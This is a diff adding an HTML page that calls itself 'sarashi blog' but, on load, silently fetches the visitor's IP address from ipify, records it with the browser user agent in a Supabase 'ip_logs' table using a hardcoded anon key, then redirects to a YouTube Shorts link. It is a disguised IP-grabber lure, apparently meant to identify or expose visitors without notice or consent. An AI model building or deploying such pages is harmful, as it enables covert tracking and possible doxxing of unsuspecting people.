@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>sarashi blog</title>
+<style>
+  body { font-family: sans-serif; background:#111; color:#0f0; display:flex; justify-content:center; align-items:center; height:100vh; }
+  #status { font-size:1rem; text-align:center; }
+</style>
+</head>
+<body>
+  <div id="status">ロード中…</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+  <script>
+    // -------------------------------
+    // 設定
+    // -------------------------------
+    const SUPABASE_URL = "https://melxxvozqlxqihcfwuez.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1lbHh4dm96cWx4cWloY2Z3dWV6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMzNDI1MjQsImV4cCI6MjA3ODkxODUyNH0.8RIWTmeYM9r6ir5GrXUvnW1y3DvZ1MLTWdDUYZqpeOI"; // ここにAnonキー
+    const REDIRECT_URL = "https://youtube.com/shorts/0zinnyOKGV8?si=vZ3gbX-9KFSemgSJ"; // 保存後に飛ばすURL
+
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // -------------------------------
+    // 完全自動ログ関数
+    // -------------------------------
+    async function autoLogIP() {
+      try {
+        // IP取得
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        const ip = data.ip;
+
+        // ブラウザ情報取得
+        const userAgent = navigator.userAgent;
+
+        // Supabase 保存
+        const { error } = await supabaseClient.from("ip_logs").insert([
+          { ip_address: ip, user_agent: userAgent }
+        ]);
+
+        if (error) {
+          console.error("保存失敗:", error);
+          document.getElementById("status").innerText = "保存失敗";
+          return;
+        }
+
+        // 保存成功 → 自動リダイレクト
+        document.getElementById("status").innerText = "保存完了、リダイレクト中…";
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 500);
+
+      } catch (err) {
+        console.error("エラー:", err);
+        document.getElementById("status").innerText = "保存に失敗";
+      }
+    }
+
+    // ページ読み込み直後に自動実行
+    window.onload = () => {
+      setTimeout(autoLogIP, 100);
+    };
+  </script>
+</body>
+</html>
